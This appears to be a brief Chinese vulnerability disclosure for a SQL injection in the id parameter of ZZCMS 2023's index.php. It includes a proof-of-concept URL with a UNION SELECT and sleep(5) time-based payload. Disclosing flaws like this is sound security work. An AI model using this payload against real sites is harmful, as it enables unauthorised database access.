# zzcms系统接口index.php存在SQL注入漏洞

ZZCMS 2023中发现了一个严重漏洞。该漏洞影响了文件/index.php中的某些未知功能,操纵参数id会导致SQL注入,攻击可能是远程发起的,该漏洞已被公开披露并可被利用。 

## poc

```javascript
http://127.0.0.1:8888/zhanting/index.php?id=1'union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,sleep(5)+--+x&skin=

```

![image-20250124101356743](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501241013807.png)

## 漏洞来源

- https://github.com/En0t5/vul/blob/main/zzcms/zzcsm-sql-inject.md